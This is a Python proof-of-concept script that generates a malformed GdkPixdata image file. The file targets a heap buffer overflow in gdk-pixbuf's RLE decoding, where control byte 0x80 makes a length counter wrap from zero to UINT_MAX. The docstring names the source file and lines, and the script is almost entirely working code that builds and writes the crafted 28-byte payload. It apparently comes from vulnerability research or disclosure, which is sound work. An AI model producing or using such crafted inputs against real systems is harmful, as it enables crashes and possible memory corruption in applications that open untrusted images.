#!/usr/bin/env python3
"""
VULN-001: Heap Buffer Overflow via RLE Control Byte 0x80 in gdk_pixbuf_from_pixdata
File: gdk-pixbuf/gdk-pixbuf/gdk-pixdata.c, lines 463-483

When control byte == 0x80 (128):
  length = 128 - 128 = 0  (guint)
  check_overrun = image_buffer + 0 * bpp > image_limit  ->  FALSE (no guard)
  do { memcpy(...); image_buffer += 3; } while (--length);
  --length on guint 0 wraps to UINT_MAX (~4 billion) -> heap buffer overflow
"""

import struct
import os

# GdkPixdata constants
GDK_PIXBUF_MAGIC_NUMBER  = 0x47646b50  # 'GdkP'
GDK_PIXDATA_COLOR_TYPE_RGB    = 0x01
GDK_PIXDATA_SAMPLE_WIDTH_8    = 0x01 << 16   # 0x00010000
GDK_PIXDATA_ENCODING_RLE      = 0x02 << 24   # 0x02000000
GDK_PIXDATA_HEADER_LENGTH     = 24           # 4+4+4+4+4+4

# Build pixdata_type: RLE + 8-bit samples + RGB
pixdata_type = GDK_PIXDATA_ENCODING_RLE | GDK_PIXDATA_SAMPLE_WIDTH_8 | GDK_PIXDATA_COLOR_TYPE_RGB
# = 0x02010001

# Image dimensions - small so deserialization succeeds
width    = 4
height   = 4
rowstride = width * 3   # 12 bytes per row, RGB

# Malicious RLE pixel data:
#   0x80 = constant-run control byte, length = 128 - 128 = 0
#   Followed by 3 color bytes (the "constant" color for the run)
# The decoder enters do-while, executes once, then --length wraps 0 -> UINT_MAX
pixel_data = b'\x80\xff\x00\x00'

# Total file length (header + pixel data) stored in the length field
total_length = GDK_PIXDATA_HEADER_LENGTH + len(pixel_data)  # 24 + 4 = 28

# Pack the 24-byte header in big-endian order
header = struct.pack('>IIIIII',
    GDK_PIXBUF_MAGIC_NUMBER,  # magic   "GdkP"
    total_length,              # length  28
    pixdata_type,              # pixdata_type  0x02010001
    rowstride,                 # rowstride  12
    width,                     # width  4
    height,                    # height 4
)

poc_bytes = header + pixel_data

out_dir = os.path.dirname(os.path.abspath(__file__))
out_path = os.path.join(out_dir, 'vuln_001.gdkp')

with open(out_path, 'wb') as f:
    f.write(poc_bytes)

print(f"[+] Generated {out_path} ({len(poc_bytes)} bytes)")
print(f"    magic:        0x{GDK_PIXBUF_MAGIC_NUMBER:08x}  ('GdkP')")
print(f"    length:       {total_length}  (header 24 + pixel_data {len(pixel_data)})")
print(f"    pixdata_type: 0x{pixdata_type:08x}  (RLE | SAMPLE_WIDTH_8 | RGB)")
print(f"    rowstride:    {rowstride}")
print(f"    width:        {width}")
print(f"    height:       {height}")
print(f"    pixel_data:   {pixel_data.hex()}  (0x80 = RLE run, length=128-128=0 -> underflow)")
